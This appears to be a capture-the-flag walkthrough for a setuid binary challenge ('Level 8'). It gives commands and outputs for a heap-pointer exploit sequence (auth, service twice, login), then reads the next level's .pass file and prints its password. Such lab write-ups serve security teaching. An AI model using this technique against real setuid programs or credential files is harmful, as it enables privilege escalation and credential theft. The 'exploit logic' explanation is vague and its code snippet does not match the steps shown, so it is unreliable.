# Level 8 Walkthrough

1. **Connect to the target machine**

	```bash
	ssh level8@<vm-ip> -p 4242
	```

2. **Check the files**

	```bash
	ls -l
	```

	Output:

	```
	-rwsr-s---+ 1 level9 users 5138 Mar  6  2016 level8
	```

3. **Test the binary**

	```bash
	./level8
	```

	Output:

	```
	(nil), (nil)
	```

	The program prints **two pointer values** and waits for input.

4. **Copy the binary locally for analysis**

	```bash
	scp -P 4242 level8@<vm-ip>:/home/user/level8/level8 .
	```

5. **Behavior analysis**

	Experimenting with commands:

	```bash
	auth AAAA
	```

	Output:

	```
	0x804a008, (nil)
	```

	Here:

	* The first pointer is set to a heap-allocated structure (after `auth`).
	* The second remains `NULL`.

	```bash
	service
	```

	Output:

	```
	0x804a008, 0x804a018
	```

	This sets the second pointer.

	```bash
	login
	```

	Prompts for password, but still uses both pointers.

6. **Exploit logic**

	* The program has two global pointers: `auth` and `service`.
	* When `login` is called, it checks:

		```c
		if (auth->password_length <= 0)
			return;
		```
	* Calling the `service` function once allows this overwrite.
	* If `service` is called again, it will use a **new memory address**.

7. **Exploit steps**

	```bash
	./level8
	auth AAAA
	service
	service
	login
	```

8. **Get Level 9 password**

	```bash
	cat /home/user/level9/.pass
	```

	Output:

	```
	c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
	```

